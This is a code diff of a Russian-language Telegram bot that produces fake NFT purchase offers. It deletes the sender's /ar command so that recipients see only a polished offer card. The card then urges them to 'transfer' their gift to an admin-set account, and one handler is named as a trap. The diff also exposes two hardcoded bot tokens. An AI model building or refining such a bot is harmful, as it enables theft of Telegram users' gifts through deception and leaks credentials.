@@ -15,38 +15,23 @@ from aiogram.types import (
 )
 
 # Токен вашего бота
-BOT_TOKEN = "8893848950:AAFsUUybra97f2jiuNuFQlBsAQsrLpTtNdk"
+BOT_TOKEN = "8983992347:AAHK7oQH8rA5rgYblvnUktThq8ODbV-F1iM"
 
 bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher(storage=MemoryStorage())
 
 # Ваш Telegram ID (главный администратор)
-SUPER_ADMIN_IDS = [8975317102, 629408999]  
+SUPER_ADMIN_IDS = [8975317102]  
 
-ALL_USERS_FILE = "all_users.json"      # Словарь: {str(user_id): username}
-BLOCKED_FILE = "blocked_users.json"    # Список заблокированных ID
+ALLOWED_FILE = "allowed_users.json"
+ALL_USERS_FILE = "all_users.json"
 CONFIG_FILE = "config.json"
 
 class AdminStates(StatesGroup):
-    waiting_for_block_id = State()
-    waiting_for_unblock_id = State()
+    waiting_for_grant_id = State()
+    waiting_for_revoke_id = State()
     waiting_for_broadcast_text = State()
     waiting_for_nft_url = State()
-
-# --- Работа с данными ---
-
-def load_all_users() -> dict:
-    if os.path.exists(ALL_USERS_FILE):
-        try:
-            with open(ALL_USERS_FILE, "r", encoding="utf-8") as f:
-                return json.load(f)
-        except Exception:
-            pass
-    return {}
-
-def save_all_users(data: dict):
-    with open(ALL_USERS_FILE, "w", encoding="utf-8") as f:
-        json.dump(data, f, ensure_ascii=False, indent=4)
 
 def load_json_set(filename: str) -> set:
     if os.path.exists(filename):
@@ -59,8 +44,9 @@ def load_json_set(filename: str) -> set:
 
 def save_json_set(filename: str, data: set):
     with open(filename, "w", encoding="utf-8") as f:
-        json.dump(list(data), f, ensure_ascii=False)
+        json.dump(list(data), f)
 
+# Управление конфигом (ссылкой для передачи NFT)
 def load_config() -> dict:
     if os.path.exists(CONFIG_FILE):
         try:
@@ -74,22 +60,16 @@ def save_config(config: dict):
     with open(CONFIG_FILE, "w", encoding="utf-8") as f:
         json.dump(config, f, ensure_ascii=False, indent=4)
 
-all_users = load_all_users()
-blocked_users = load_json_set(BLOCKED_FILE)
+allowed_users = load_json_set(ALLOWED_FILE)
+all_users = load_json_set(ALL_USERS_FILE)
 
-def register_user(user):
-    user_id_str = str(user.id)
-    username = f"@{user.username}" if user.username else "нет юзернейма"
-    # Сохраняем или обновляем юзернейм
-    if user_id_str not in all_users or all_users[user_id_str] != username:
-        all_users[user_id_str] = username
-        save_all_users(all_users)
+def register_user(user_id: int):
+    if user_id not in all_users:
+        all_users.add(user_id)
+        save_json_set(ALL_USERS_FILE, all_users)
 
-def is_blocked(user_id: int) -> bool:
-    return user_id in blocked_users
-
-# Кэш для NFT
-NFT_CACHE = {}
+def is_authorized(user_id: int) -> bool:
+    return user_id in SUPER_ADMIN_IDS or user_id in allowed_users
 
 def normalize_slug(raw_input: str) -> str:
     text = raw_input.strip()
@@ -151,9 +131,6 @@ def parse_query_and_price(raw_text: str) -> tuple[str, str, str]:
     return slug, f"{val} ⭐️ Звёзд", f"{val} ⭐️"
 
 async def fetch_real_nft_data(slug: str) -> dict:
-    if slug in NFT_CACHE:
-        return NFT_CACHE[slug]
-
     url = f"https://t.me/nft/{slug}"
     fallback_data = {
         "slug": slug,
@@ -166,7 +143,7 @@ async def fetch_real_nft_data(slug: str) -> dict:
 
     headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
     try:
-        timeout = aiohttp.ClientTimeout(total=2.5)
+        timeout = aiohttp.ClientTimeout(total=4)
         async with aiohttp.ClientSession(headers=headers, timeout=timeout) as session_http:
             async with session_http.get(url) as resp:
                 if resp.status != 200:
@@ -185,7 +162,7 @@ async def fetch_real_nft_data(slug: str) -> dict:
             if th and td:
                 details[th.get_text(" ", strip=True).lower()] = td.get_text(" ", strip=True)
 
-        result_data = {
+        return {
             "slug": slug,
             "url": url,
             "name": title_meta["content"].strip()[:100],
@@ -193,8 +170,6 @@ async def fetch_real_nft_data(slug: str) -> dict:
             "model": details.get("model", "Стандарт")[:50],
             "backdrop": details.get("backdrop", "Стандарт")[:50],
         }
-        NFT_CACHE[slug] = result_data
-        return result_data
     except Exception:
         return fallback_data
 
@@ -214,71 +189,59 @@ def get_step1_kb() -> InlineKeyboardMarkup:
 
 def get_step2_kb() -> InlineKeyboardMarkup:
     config = load_config()
-    target_url = config.get("nft_url", "https://t.me/GiftReseII").strip()
-    if target_url.startswith("@"):
-        target_url = f"https://t.me/{target_url[1:]}"
-    elif not target_url.startswith(("http://", "https://", "tg://")):
-        target_url = f"https://{target_url}"
-
+    target_url = config.get("nft_url", "https://t.me/GiftReseII")
     return InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="🎁 Передать NFT", url=target_url)],
         [InlineKeyboardButton(text="➡️ Продолжить", callback_data="explain_continue_btn")]
     ])
 
-# --- Команды пользователя ---
-
 @dp.message(F.text.in_({"/start", "/id"}))
 async def cmd_start(message: Message):
-    register_user(message.from_user)
+    register_user(message.from_user.id)
     uid = message.from_user.id
+    is_auth = is_authorized(uid)
     
-    if is_blocked(uid):
-        await message.answer("❌ <b>Ваш доступ к боту заблокирован администратором.</b>", parse_mode="HTML")
-        return
-
-    bot_info = await bot.get_me()
+    status_text = "✅ <b>У вас есть доступ к использованию бота.</b>" if is_auth else "❌ <b>У вас нет доступа к боту. Обратитесь к администратору.</b>"
     
     text = (
         "🎁 <b>Генератор интерактивных офферов NFT</b>\n\n"
         f"🔑 Ваш Telegram ID: <code>{uid}</code>\n"
-        "✅ <b>Бот полностью бесплатен и доступен для использования!</b>\n\n"
-        "⚙️ <b>Как отправить карточку:</b>\n"
-        f"1️⃣ <b>Через Инлайн (в любом чате):</b> напишите <code>@{bot_info.username} [ссылка] [цена]</code>\n"
-        "2️⃣ <b>Через команду (в группах/бизнесе):</b> напишите <code>/ar [ссылка] [цена]</code>\n"
+        f"{status_text}\n\n"
+        "⚙️ <b>Способы отправки:</b>\n"
+        "• <code>/ar [ссылка] [цена]</code> — отправить оффер (команда удалится автоматически)\n"
+        "• <code>@имя_бота [ссылка] [цена]</code> — отправка через инлайн без команд в чате\n"
     )
     if uid in SUPER_ADMIN_IDS:
-        text += "\n• <code>/admins</code> — админ-панель"
+        text += "• <code>/admins</code> — админ-панель"
 
     await message.answer(text, parse_mode="HTML")
 
-# --- Админ-панель ---
-
 @dp.message(F.text == "/admins")
 async def cmd_admins(message: Message, state: FSMContext):
-    register_user(message.from_user)
+    register_user(message.from_user.id)
     if message.from_user.id not in SUPER_ADMIN_IDS:
         await message.answer("❌ У вас нет прав администратора.")
         return
         
     total_users = len(all_users)
-    blocked_count = len(blocked_users)
+    auth_count = len(allowed_users)
     config = load_config()
     current_url = config.get("nft_url", "https://t.me/GiftReseII")
     
     text = (
         f"👑 <b>Админ-панель</b>\n\n"
         f"Всего пользователей: <b>{total_users}</b>\n"
-        f"Заблокировано: <b>{blocked_count}</b>\n"
-        f"🔗 Ссылка для передачи: <code>{current_url}</code>"
+        f"С доступом: <b>{auth_count}</b>\n"
+        f"🔗 Текущая ссылка для передачи: <code>{current_url}</code>"
     )
     
     kb = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="📋 Список пользователей", callback_data="admin_list")],
+        [InlineKeyboardButton(text="📋 Список доступов", callback_data="admin_list")],
         [InlineKeyboardButton(text="🔗 Изменить ссылку NFT", callback_data="admin_set_url")],
         [InlineKeyboardButton(text="📢 Рассылка", callback_data="admin_broadcast_start")],
         [
-            InlineKeyboardButton(text="🚫 Заблокировать", callback_data="admin_block_start"),
-            InlineKeyboardButton(text="✅ Разблокировать", callback_data="admin_unblock_start")
+            InlineKeyboardButton(text="➕ Выдать доступ", callback_data="admin_grant_start"),
+            InlineKeyboardButton(text="❌ Забрать доступ", callback_data="admin_revoke_start")
         ]
     ])
     await message.answer(text, parse_mode="HTML", reply_markup=kb)
@@ -287,49 +250,35 @@ async def cmd_admins(message: Message, state: FSMContext):
 async def cb_admin_list(callback: CallbackQuery):
     if callback.from_user.id not in SUPER_ADMIN_IDS:
         return
-    
-    if not all_users:
-        users_text = "Список пользователей пуст."
-    else:
-        lines = []
-        for uid_str, uname in all_users.items():
-            status = " 🔴 [Заблокирован]" if int(uid_str) in blocked_users else ""
-            lines.append(f"• {uname} (<code>{uid_str}</code>){status}")
-        users_text = "\n".join(lines)
-        
-        # Telegram ограничивает длину сообщения, если пользователей слишком много
-        if len(users_text) > 4000:
-            users_text = users_text[:4000] + "\n\n... (список слишком длинный)"
-
+    users_list = "\n".join([f"• <code>{uid}</code>" for uid in allowed_users]) if allowed_users else "Список пуст"
     back_kb = InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="⬅️ Назад", callback_data="admin_back")]
     ])
-    await callback.message.edit_text(f"📋 <b>Список пользователей (Юз | ID):</b>\n\n{users_text}", parse_mode="HTML", reply_markup=back_kb)
+    await callback.message.edit_text(f"📋 <b>Доступы:</b>\n\n{users_list}", parse_mode="HTML", reply_markup=back_kb)
     await callback.answer()
 
 @dp.callback_query(F.data == "admin_back")
-async def cb_admin_back(callback: CallbackQuery, state: FSMContext):
+async def cb_admin_back(callback: CallbackQuery):
     if callback.from_user.id not in SUPER_ADMIN_IDS:
         return
-    await state.clear()
     total_users = len(all_users)
-    blocked_count = len(blocked_users)
+    auth_count = len(allowed_users)
     config = load_config()
     current_url = config.get("nft_url", "https://t.me/GiftReseII")
     
     text = (
         f"👑 <b>Админ-панель</b>\n\n"
         f"Всего пользователей: <b>{total_users}</b>\n"
-        f"Заблокировано: <b>{blocked_count}</b>\n"
-        f"🔗 Ссылка для передачи: <code>{current_url}</code>"
+        f"С доступом: <b>{auth_count}</b>\n"
+        f"🔗 Текущая ссылка для передачи: <code>{current_url}</code>"
     )
     kb = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="📋 Список пользователей", callback_data="admin_list")],
+        [InlineKeyboardButton(text="📋 Список доступов", callback_data="admin_list")],
         [InlineKeyboardButton(text="🔗 Изменить ссылку NFT", callback_data="admin_set_url")],
         [InlineKeyboardButton(text="📢 Рассылка", callback_data="admin_broadcast_start")],
         [
-            InlineKeyboardButton(text="🚫 Заблокировать", callback_data="admin_block_start"),
-            InlineKeyboardButton(text="✅ Разблокировать", callback_data="admin_unblock_start")
+            InlineKeyboardButton(text="➕ Выдать доступ", callback_data="admin_grant_start"),
+            InlineKeyboardButton(text="❌ Забрать доступ", callback_data="admin_revoke_start")
         ]
     ])
     await callback.message.edit_text(text, parse_mode="HTML", reply_markup=kb)
@@ -345,31 +294,31 @@ async def cb_set_url(callback: CallbackQuery, state: FSMContext):
     back_kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="⬅️ Отмена", callback_data="admin_back")]])
     await callback.message.edit_text(
         f"🔗 Текущая ссылка: <code>{current_url}</code>\n\n"
-        "<b>Отправьте новую ссылку</b>:",
+        "<b>Отправьте новую ссылку</b> (например: <code>https://t.me/NewAccount</code> или <code>t.me/account</code>):",
         parse_mode="HTML", reply_markup=back_kb
     )
     await callback.answer()
 
-@dp.callback_query(F.data == "admin_block_start")
-async def cb_block_start(callback: CallbackQuery, state: FSMContext):
+@dp.callback_query(F.data == "admin_grant_start")
+async def cb_grant_start(callback: CallbackQuery, state: FSMContext):
     if callback.from_user.id not in SUPER_ADMIN_IDS:
         return
-    await state.set_state(AdminStates.waiting_for_block_id)
+    await state.set_state(AdminStates.waiting_for_grant_id)
     back_kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="⬅️ Отмена", callback_data="admin_back")]])
     await callback.message.edit_text(
-        "🚫 <b>Введите Telegram ID пользователя</b>, которого хотите заблокировать:",
+        "➕ <b>Введите Telegram ID пользователя</b>, которому хотите выдать доступ:",
         parse_mode="HTML", reply_markup=back_kb
     )
     await callback.answer()
 
-@dp.callback_query(F.data == "admin_unblock_start")
-async def cb_unblock_start(callback: CallbackQuery, state: FSMContext):
+@dp.callback_query(F.data == "admin_revoke_start")
+async def cb_revoke_start(callback: CallbackQuery, state: FSMContext):
     if callback.from_user.id not in SUPER_ADMIN_IDS:
         return
-    await state.set_state(AdminStates.waiting_for_unblock_id)
+    await state.set_state(AdminStates.waiting_for_revoke_id)
     back_kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="⬅️ Отмена", callback_data="admin_back")]])
     await callback.message.edit_text(
-        "✅ <b>Введите Telegram ID пользователя</b>, которого хотите разблокировать:",
+        "❌ <b>Введите Telegram ID пользователя</b>, у которого хотите забрать доступ:",
         parse_mode="HTML", reply_markup=back_kb
     )
     await callback.answer()
@@ -391,46 +340,39 @@ async def process_nft_url(message: Message, state: FSMContext):
     if message.from_user.id not in SUPER_ADMIN_IDS:
         return
     new_url = message.text.strip()
-    if new_url.startswith("@"):
-        new_url = f"https://t.me/{new_url[1:]}"
-    elif not new_url.startswith(("http://", "https://", "tg://")):
-        new_url = f"https://{new_url}"
     config = load_config()
     config["nft_url"] = new_url
     save_config(config)
-    await message.answer(f"✅ Ссылка успешно изменена на:\n<code>{new_url}</code>", parse_mode="HTML")
+    await message.answer(f"✅ Ссылка для кнопки «Передать NFT» успешно изменена на:\n<code>{new_url}</code>", parse_mode="HTML")
     await state.clear()
 
-@dp.message(AdminStates.waiting_for_block_id)
-async def process_block_id(message: Message, state: FSMContext):
+@dp.message(AdminStates.waiting_for_grant_id)
+async def process_grant_id(message: Message, state: FSMContext):
     if message.from_user.id not in SUPER_ADMIN_IDS:
         return
     try:
         target_id = int(message.text.strip())
-        if target_id in SUPER_ADMIN_IDS:
-            await message.answer("❌ Нельзя заблокировать главного администратора!")
-        else:
-            blocked_users.add(target_id)
-            save_json_set(BLOCKED_FILE, blocked_users)
-            await message.answer(f"🚫 Пользователь <code>{target_id}</code> успешно заблокирован.", parse_mode="HTML")
+        allowed_users.add(target_id)
+        save_json_set(ALLOWED_FILE, allowed_users)
+        await message.answer(f"✅ Пользователь <code>{target_id}</code> успешно добавлен в список разрешенных!", parse_mode="HTML")
     except ValueError:
-        await message.answer("❌ Неверный формат. Введите числовой Telegram ID.")
+        await message.answer("❌ Неверный формат. Пожалуйста, введите числовой Telegram ID.")
     await state.clear()
 
-@dp.message(AdminStates.waiting_for_unblock_id)
-async def process_unblock_id(message: Message, state: FSMContext):
+@dp.message(AdminStates.waiting_for_revoke_id)
+async def process_revoke_id(message: Message, state: FSMContext):
     if message.from_user.id not in SUPER_ADMIN_IDS:
         return
     try:
         target_id = int(message.text.strip())
-        if target_id in blocked_users:
-            blocked_users.remove(target_id)
-            save_json_set(BLOCKED_FILE, blocked_users)
-            await message.answer(f"✅ Пользователь <code>{target_id}</code> разблокирован.", parse_mode="HTML")
+        if target_id in allowed_users:
+            allowed_users.remove(target_id)
+            save_json_set(ALLOWED_FILE, allowed_users)
+            await message.answer(f"❌ Доступ у пользователя <code>{target_id}</code> успешно забран.", parse_mode="HTML")
         else:
-            await message.answer(f"⚠️ Пользователь <code>{target_id}</code> не найден в списке заблокированных.", parse_mode="HTML")
+            await message.answer(f"⚠️ Пользователь <code>{target_id}</code> не найден в списке доступов.", parse_mode="HTML")
     except ValueError:
-        await message.answer("❌ Неверный формат. Введите числовой Telegram ID.")
+        await message.answer("❌ Неверный формат. Пожалуйста, введите числовой Telegram ID.")
     await state.clear()
 
 @dp.message(AdminStates.waiting_for_broadcast_text)
@@ -444,9 +386,8 @@ async def process_broadcast(message: Message, state: FSMContext):
     success = 0
     fail = 0
     
-    for uid_str in all_users.keys():
+    for uid in all_users:
         try:
-            uid = int(uid_str)
             await bot.send_message(uid, broadcast_text, parse_mode="HTML")
             success += 1
             await asyncio.sleep(0.04)
@@ -455,41 +396,43 @@ async def process_broadcast(message: Message, state: FSMContext):
             
     await status_msg.edit_text(
         f"📢 <b>Рассылка завершена!</b>\n\n"
-        f"✅ Доставлено: <b>{success}</b>\n"
+        f"✅ Успешно доставлено: <b>{success}</b>\n"
         f"❌ Ошибок (заблокировали бота): <b>{fail}</b>",
         parse_mode="HTML"
     )
 
-# --- Обработка команд /ar и Inline ---
-
+# =====================================================================
+# ИСПРАВЛЕННАЯ ФУНКЦИЯ: СНАЧАЛА УДАЛЯЕТ КОМАНДУ /ar, ЗАТЕМ ШЛЕТ КАРТОЧКУ
+# =====================================================================
 async def execute_ar_command(message: Message, is_business: bool = False):
-    if not message.from_user:
-        return
-
     user_id = message.from_user.id
-    register_user(message.from_user)
+    register_user(user_id)
     
-    if is_blocked(user_id):
+    if not is_authorized(user_id):
+        if not is_business:
+            await message.answer("❌ У вас нет доступа к использованию этого бота.")
         return
 
     text = message.text or ""
-    parts = text.split(maxsplit=1)
-    raw_args = parts[1].strip() if len(parts) > 1 else "MirageLamp-44307 2727 stars"
+    args_text = text[3:].strip()
+    raw_args = args_text or "MirageLamp-44307 2727 stars"
     
     slug, price_display, _ = parse_query_and_price(raw_args)
     biz_conn_id = message.business_connection_id if is_business else None
 
+    # 1. Мгновенно удаляем сообщение с командой /ar, чтобы не было видно команды и значка "изменено"
     try:
         if biz_conn_id:
             await bot.delete_business_messages(
                 business_connection_id=biz_conn_id,
                 message_ids=[message.message_id]
             )
-        elif message.chat.type != "private":
+        else:
             await message.delete()
     except Exception as e:
-        print(f"[INFO] Не удалось удалить сообщение: {e}")
+        print(f"Не удалось удалить исходную команду: {e}")
 
+    # 2. Парсим данные подарка и отправляем совершенно новое чистое сообщение
     data = await fetch_real_nft_data(slug)
 
     preview_opts = LinkPreviewOptions(
@@ -500,35 +443,33 @@ async def execute_ar_command(message: Message, is_business: bool = False):
     )
 
     try:
-        kwargs = {
-            "chat_id": message.chat.id,
-            "text": format_parsed_card(data, price_display),
-            "parse_mode": "HTML",
-            "link_preview_options": preview_opts,
-            "reply_markup": get_step1_kb()
-        }
-        if biz_conn_id:
-            kwargs["business_connection_id"] = biz_conn_id
-
-        await bot.send_message(**kwargs)
+        await bot.send_message(
+            chat_id=message.chat.id,
+            business_connection_id=biz_conn_id,
+            text=format_parsed_card(data, price_display),
+            parse_mode="HTML",
+            link_preview_options=preview_opts,
+            reply_markup=get_step1_kb()
+        )
     except Exception as e:
-        print(f"[ERROR] Ошибка отправки карточки: {e}")
+        print(f"Ошибка отправки карточки: {e}")
 
-@dp.message(F.text.regexp(r"^/ar(\b|@)"))
+@dp.message(F.text.startswith("/ar"))
 async def handle_regular_ar(message: Message):
     await execute_ar_command(message, is_business=False)
 
-@dp.business_message(F.text.regexp(r"^/ar(\b|@)"))
+@dp.business_message(F.text.startswith("/ar"))
 async def handle_business_ar(message: Message):
     await execute_ar_command(message, is_business=True)
 
+# =====================================================================
+# ДОБАВЛЕН INLINE-РЕЖИМ (ЧТОБЫ ОТПРАВЛЯТЬ ВООБЩЕ БЕЗ КОМАНДЫ /ar В ЧАТЕ)
+# =====================================================================
 @dp.inline_query()
 async def handle_inline_ar(inline_query: InlineQuery):
     user_id = inline_query.from_user.id
-    register_user(inline_query.from_user)
-    
-    if is_blocked(user_id):
-        await inline_query.answer([], switch_pm_text="❌ Ваш доступ заблокирован", switch_pm_parameter="blocked", cache_time=1)
+    register_user(user_id)
+    if not is_authorized(user_id):
         return
 
     raw_args = inline_query.query.strip() or "MirageLamp-44307 2727 stars"
@@ -557,8 +498,6 @@ async def handle_inline_ar(inline_query: InlineQuery):
 
     await inline_query.answer([result], cache_time=1, is_personal=True)
 
-# --- Кнопки интерфейса ---
-
 @dp.callback_query(F.data == "step2_accept")
 async def process_step2(callback: CallbackQuery):
     step2_text = (
@@ -566,25 +505,10 @@ async def process_step2(callback: CallbackQuery):
         "1. Нажмите <b>«Передать NFT»</b> и отправьте подарок.\n"
         "2. После отправки нажмите <b>«Продолжить»</b>."
     )
-    try:
-        if callback.inline_message_id:
-            await bot.edit_message_text(
-                inline_message_id=callback.inline_message_id,
-                text=step2_text,
-                parse_mode="HTML",
-                reply_markup=get_step2_kb()
-            )
-        elif callback.message:
-            await bot.edit_message_text(
-                chat_id=callback.message.chat.id,
-                message_id=callback.message.message_id,
-                business_connection_id=callback.message.business_connection_id,
-                text=step2_text,
-                parse_mode="HTML",
-                reply_markup=get_step2_kb()
-            )
-    except Exception as e:
-        print(f"[ERROR] Ошибка step2: {e}")
+    if callback.message:
+        await callback.message.edit_text(text=step2_text, parse_mode="HTML", reply_markup=get_step2_kb())
+    elif callback.inline_message_id:
+        await bot.edit_message_text(inline_message_id=callback.inline_message_id, text=step2_text, parse_mode="HTML", reply_markup=get_step2_kb())
     await callback.answer()
 
 @dp.callback_query(F.data == "explain_continue_btn")
@@ -594,30 +518,15 @@ async def explain_continue_trap(callback: CallbackQuery):
 @dp.callback_query(F.data == "decline_offer")
 async def process_decline(callback: CallbackQuery):
     declined_text = "❌ <b>Предложение отклонено владельцем</b>"
-    try:
-        if callback.inline_message_id:
-            await bot.edit_message_text(
-                inline_message_id=callback.inline_message_id,
-                text=declined_text,
-                parse_mode="HTML"
-            )
-        elif callback.message:
-            await bot.edit_message_text(
-                chat_id=callback.message.chat.id,
-                message_id=callback.message.message_id,
-                business_connection_id=callback.message.business_connection_id,
-                text=declined_text,
-                parse_mode="HTML"
-            )
-    except Exception as e:
-        print(f"[ERROR] Ошибка decline: {e}")
+    if callback.message:
+        await callback.message.edit_text(text=declined_text, parse_mode="HTML")
+    elif callback.inline_message_id:
+        await bot.edit_message_text(inline_message_id=callback.inline_message_id, text=declined_text, parse_mode="HTML")
     await callback.answer("Оффер отклонен")
 
 async def main():
-    await bot.delete_webhook(drop_pending_updates=True)
-    bot_info = await bot.get_me()
-    print(f"Бот @{bot_info.username} успешно запущен и работает для всех!")
-    await dp.start_polling(bot, allowed_updates=dp.resolve_used_update_types())
+    print("Бот успешно запущен!")
+    await dp.start_polling(bot)
 
 if __name__ == "__main__":
     asyncio.run(main())
